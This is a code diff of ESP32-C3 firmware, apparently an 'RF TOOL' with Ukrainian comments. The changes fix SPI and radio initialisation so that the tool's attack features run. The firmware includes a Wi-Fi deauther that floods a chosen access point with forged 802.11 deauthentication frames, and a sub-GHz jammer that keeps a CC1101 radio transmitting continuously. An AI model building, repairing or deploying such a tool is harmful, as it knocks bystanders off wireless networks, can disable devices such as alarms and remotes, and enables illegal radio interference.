@@ -1,12 +1,8 @@
 /*
- * RF TOOL v3.0 for ESP32-C3 Supermini
- * Features: Wi-Fi Deauther, Sub-GHz Scanner & Jammer (RadioLib)
- * Display: ST7735 0.96" (80x160)
- * 
- * Pinout:
- * TFT: CS=5, DC=6, RST=7, SCK=8, MOSI=10, LED=3.3V (resistor)
- * CC1101: CS=4, SCK=8, MOSI=10, MISO=21
- * Buttons: UP=1, DOWN=20, SEL=3, BACK=0
+ * RF TOOL v3.1 for ESP32-C3 Supermini (FIXED)
+ * - Виправлено ініціалізацію SPI
+ * - Виправлено конструктор RadioLib
+ * - Додано підтримку 160x80 для ST7735
  */
 
 #include <SPI.h>
@@ -31,8 +27,13 @@
 #define BTN_SEL     3
 #define BTN_BACK    0
 
+// ====================== Дисплей ======================
+// Для 0.96" 160x80 використовуємо init(INITR_MINI160x80)
 Adafruit_ST7735 tft = Adafruit_ST7735(TFT_CS, TFT_DC, TFT_RST);
-CC1101 cc1101 = new Module(CC1101_CS, 255, 255, CC1101_MISO);
+
+// ====================== CC1101 ======================
+// RadioLib сам візьме MISO з поточної шини SPI
+CC1101 cc1101 = new Module(CC1101_CS, RADIOLIB_NC, RADIOLIB_NC);
 
 // ====================== Стани меню ======================
 enum MenuState {
@@ -60,7 +61,7 @@ uint8_t apBSSID[20][6];
 int apChannels[20];
 
 // Налаштування
-int brightness = 150; // не використовується, але залишено для сумісності
+int brightness = 150;
 
 // ====================== Прототипи ======================
 void drawMainMenu();
@@ -75,42 +76,54 @@ void startDeauth(uint8_t* bssid, int channel);
 // ====================== Setup ======================
 void setup() {
   Serial.begin(115200);
-  
-  // Кнопки
+  delay(500); // Зачекати стабілізацію живлення
+
+  // --- Кнопки ---
   pinMode(BTN_UP, INPUT_PULLUP);
   pinMode(BTN_DOWN, INPUT_PULLUP);
   pinMode(BTN_SEL, INPUT_PULLUP);
   pinMode(BTN_BACK, INPUT_PULLUP);
-  
-  // Дисплей (підсвітка завжди ввімкнена через резистор до 3.3V)
-  SPI.begin(TFT_SCLK, -1, TFT_MOSI, TFT_CS);
-  tft.initR(INITR_BLACKTAB);
-  tft.setRotation(1);
+
+  // --- ЄДИНИЙ виклик SPI.begin() для всієї шини ---
+  SPI.begin(TFT_SCLK, CC1101_MISO, TFT_MOSI);
+  // CS-піни будуть керуватися бібліотеками окремо
+
+  // --- Ініціалізація дисплея ---
+  tft.initR(INITR_MINI160x80); // Спеціальний режим для 160x80
+  tft.setRotation(1);          // Ваш дисплей може потребувати 1 або 3
   tft.fillScreen(ST77XX_BLACK);
-  
-  // CC1101 (RadioLib)
-  SPI.begin(8, CC1101_MISO, 10, CC1101_CS);
+  tft.setTextColor(ST77XX_GREEN);
+  tft.setTextSize(1);
+  tft.setCursor(5, 5);
+  tft.print("Init TFT OK");
+
+  // --- Ініціалізація CC1101 ---
   int state = cc1101.begin(freqs[freqIndex]);
   if (state == RADIOLIB_ERR_NONE) {
     Serial.println("CC1101 OK");
     cc1101.setOutputPower(12);
+    tft.setCursor(5, 20);
+    tft.print("CC1101 OK");
   } else {
     Serial.print("CC1101 failed, code: ");
     Serial.println(state);
+    tft.setCursor(5, 20);
+    tft.print("CC1101 FAIL");
   }
-  
-  // Wi-Fi
+
+  // --- Wi-Fi ---
   WiFi.mode(WIFI_STA);
-  esp_wifi_set_protocol(WIFI_IF_STA, WIFI_PROTOCOL_11B|WIFI_PROTOCOL_11G|WIFI_PROTOCOL_11N);
+  esp_wifi_set_protocol(WIFI_IF_STA, WIFI_PROTOCOL_11B | WIFI_PROTOCOL_11G | WIFI_PROTOCOL_11N);
   esp_wifi_set_ps(WIFI_PS_NONE);
-  
+
+  delay(1000);
   drawMainMenu();
 }
 
 // ====================== Головний цикл ======================
 void loop() {
   checkButtons();
-  
+
   if (currentState == SUBGHZ_SCAN && isRunning) {
     static unsigned long lastScan = 0;
     if (millis() - lastScan > 200) {
@@ -123,25 +136,24 @@ void loop() {
       tft.print(" dBm");
     }
   }
-  
+
   if (currentState == SUBGHZ_JAM && isRunning) {
     cc1101.transmitDirect();
   } else if (currentState == SUBGHZ_JAM && !isRunning) {
     cc1101.standby();
   }
-  
+
   delay(20);
 }
 
-// ====================== Інтерфейс ======================
+// ====================== Інтерфейс (без змін) ======================
 void drawMainMenu() {
   tft.fillScreen(ST77XX_BLACK);
-  tft.setTextSize(1);
   tft.setTextColor(ST77XX_GREEN);
   tft.setCursor(10, 5);
-  tft.println("RF TOOL v3.0");
+  tft.println("RF TOOL v3.1");
   tft.drawLine(0, 15, 80, 15, ST77XX_WHITE);
-  
+
   const char* items[] = {"Wi-Fi Tools", "Sub-GHz Scan", "Sub-GHz Jam", "Settings"};
   for (int i = 0; i < 4; i++) {
     int y = 30 + i * 20;
@@ -166,7 +178,7 @@ void drawWiFiMenu() {
   tft.setCursor(10, 5);
   tft.print("Wi-Fi Tools");
   tft.drawLine(0, 15, 80, 15, ST77XX_WHITE);
-  
+
   const char* items[] = {"Scan APs", "Start Deauth"};
   for (int i = 0; i < 2; i++) {
     int y = 30 + i * 20;
@@ -237,16 +249,16 @@ void drawSettings() {
   tft.print("Brightness: 100%");
 }
 
-// ====================== Обробка кнопок ======================
+// ====================== Обробка кнопок (без змін) ======================
 void checkButtons() {
   static unsigned long lastPress = 0;
   if (millis() - lastPress < 200) return;
-  
+
   bool up = (digitalRead(BTN_UP) == LOW);
   bool down = (digitalRead(BTN_DOWN) == LOW);
   bool sel = (digitalRead(BTN_SEL) == LOW);
   bool back = (digitalRead(BTN_BACK) == LOW);
-  
+
   if (up) {
     lastPress = millis();
     if (currentState == MAIN_MENU) {
@@ -265,7 +277,7 @@ void checkButtons() {
       drawSubGHzJam();
     }
   }
-  
+
   if (down) {
     lastPress = millis();
     if (currentState == MAIN_MENU) {
@@ -284,7 +296,7 @@ void checkButtons() {
       drawSubGHzJam();
     }
   }
-  
+
   if (sel) {
     lastPress = millis();
     if (currentState == MAIN_MENU) {
@@ -315,7 +327,7 @@ void checkButtons() {
       drawSubGHzJam();
     }
   }
-  
+
   if (back) {
     lastPress = millis();
     if (currentState != MAIN_MENU) {
@@ -327,7 +339,7 @@ void checkButtons() {
   }
 }
 
-// ====================== Wi-Fi функції ======================
+// ====================== Wi-Fi функції (без змін) ======================
 void scanWiFi() {
   apCount = WiFi.scanNetworks();
   if (apCount > 20) apCount = 20;
@@ -337,7 +349,7 @@ void scanWiFi() {
     memcpy(apBSSID[i], WiFi.BSSID(i), 6);
   }
   WiFi.scanDelete();
-  
+
   tft.fillScreen(ST77XX_BLACK);
   tft.setTextColor(ST77XX_GREEN);
   tft.setCursor(10, 5);
@@ -358,7 +370,7 @@ void startDeauth(uint8_t* bssid, int channel) {
     0x00, 0x00,
     0x01, 0x00
   };
-  
+
   tft.fillScreen(ST77XX_BLACK);
   tft.setTextColor(ST77XX_RED);
   tft.setCursor(10, 30);
@@ -367,12 +379,12 @@ void startDeauth(uint8_t* bssid, int channel) {
   tft.print("ATTACK");
   tft.setCursor(10, 70);
   tft.print("ACTIVE");
-  
+
   esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
   for (int i = 0; i < 500; i++) {
     esp_wifi_80211_tx(WIFI_IF_STA, deauthPacket, sizeof(deauthPacket), false);
     delay(10);
   }
-  
+
   drawWiFiMenu();
 }
